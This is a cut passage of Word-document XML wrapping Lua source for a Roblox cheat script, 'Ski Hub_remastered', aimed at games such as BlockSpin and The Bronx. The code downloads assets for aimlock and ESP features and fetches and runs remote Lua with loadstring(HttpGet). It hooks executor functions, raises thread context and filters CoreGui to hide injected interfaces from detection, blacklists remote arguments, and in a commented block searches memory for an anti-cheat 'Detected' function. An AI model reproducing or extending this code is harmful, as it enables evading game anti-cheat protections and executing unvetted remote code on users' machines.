        <w:t xml:space="preserve">                    Enabled = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RGB = Color3.fromRGB(255, 255, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Connections = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService = Services.RunService;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Fonts = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--[[if not Solara and Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local DTC;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    repeat task.wait(.25) LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in next, getgc(true) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if type(Value) == "table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Detected = rawget(Value, "Detected");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(Detected) == "function" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    DTC = Detected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    until DTC ~= nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>getgenv().library = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    directory = "Ski Hub_remastered",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    folders = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        "/fonts",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        "/configs",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        "/assets"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    priority = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    whitelist = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    flags = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    config_flags = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    connections = {},   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    notifications = {notifs = {}},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    current_open; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Images = {"ESP.png", "World.png", "Wrench.png", "Settings.png", "Node.png", "cursor.png", "Bullet.png", "Snapline.png", "Pistol.png", "folder.png", "UZI.png", "FieldOfView2.png", "Lock.png", "Aimlock.png", "Cash.png", "Wheatt.png", "Pickkaxe.png", "unlocked.png"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">for _, path in next, library.folders do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    makefolder(library.directory .. path)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>for Index, Value in Images do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Location = library.directory.."/assets/"..Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not isfile(Location) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ImageDiddyAhhBlud = game:HttpGet("https://raw.githubusercontent.com/KingVonOBlockJoyce/imagessynex/main/"..Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        repeat wait() until ImageDiddyAhhBlud ~= nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        writefile(Location, ImageDiddyAhhBlud)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>GetImage = LPH_NO_VIRTUALIZE(function(Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Location = library.directory.."/assets/"..Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if isfile(Location) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return getcustomasset(Location)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Collide_Data = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local DefaultPlayerSettings = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if not Services.Players.LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Services.Players.LocalPlayer.CharacterAdded:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>for Index, Value in Services.Players.LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    pcall(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Value.CanCollide == true then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Collide_Data[Value.Name] = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Game_Name == "BlockSpin" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Repr = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ozzypig/repr/refs/heads/master/repr.lua"))()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local Required = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"hookfunction",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"getthreadcontext",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"getconnections",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"setthreadcontext",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"isexecutorclosure",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"hookmetamethod",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"getrenv",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>for _, v in next, Required do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not getgenv()[v] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>game:GetService("Players").LocalPlayer:Kick(`Your executor does not support [{v}], which is REQUIRED to use the BlockSpin script.`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local OldDebugTraceback, OldDebugInfo, OldFenv = debug.traceback, debug.info, getfenv</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local BlacklistedRemoteArgumentNeedles = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"invalid_entry",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"replicate_bil",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local BlacklistedCallerNeedles = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"Obfuscated",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>if not shared.Hooking then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>shared.Hooking = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>if not shared.Hooking.IncludeInStackFunctions then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>shared.Hooking.IncludeInStackFunctions = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>shared.SafeHook = function(Original, Replacement)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>shared.Hooking.IncludeInStackFunctions[Original] = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return hookfunction(Original, Replacement)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local CoreGui = game:GetService("CoreGui")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local RobloxGuis = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"RobloxGui",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"TeleportGui",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"RobloxPromptGui",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"RobloxGui",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"PlayerList",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"RobloxNetworkPauseNotification",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"PurchasePrompt",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"HeadsetDisconnectedDialog",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"ThemeProvider",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>"DevConsoleMaster",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local function FilterTable(InputTable)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local OldContext = getthreadcontext()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>setthreadcontext(7)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Filtered = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local GameInstance = game</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for Index, Value in ipairs(InputTable) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(Value) ~= "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(Filtered, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Value == CoreGui or Value == GameInstance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- Insert only the default Roblox GUIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, GuiName in pairs(RobloxGuis) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local GuiInstance = CoreGui:FindFirstChild(GuiName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if GuiInstance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(Filtered, GuiInstance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Value == GameInstance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, Child in pairs(GameInstance:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Child ~= CoreGui then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(Filtered, Child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not CoreGui:IsAncestorOf(Value) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(Filtered, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- Only include if it's a descendant of one of the default GUIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, DefaultGuiName in pairs(RobloxGuis) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local DefaultGuiInstance = CoreGui:FindFirstChild(DefaultGuiName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if DefaultGuiInstance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Value == DefaultGuiInstance or DefaultGuiInstance:IsAncestorOf(Value) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(Filtered, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>setthreadcontext(OldContext)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return Filtered</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local BlacklistedAssets = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local ContentProvider = game:GetService("ContentProvider")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local function logDebugMessage(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Strings = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, v in next, { ... } do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(Strings, tostring(v))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Message = table.concat(Strings, ", ")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>warn(`{Message}\n`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local function ValidTraceback(s)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local dotPos = string.find(s, "%.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local colonPos = string.find(s, ":")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not dotPos then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not colonPos then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return dotPos &lt; colonPos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local function TracebackLines(str)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local pos = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not pos then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local p1, p2 = string.find(str, "\r?\n", pos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
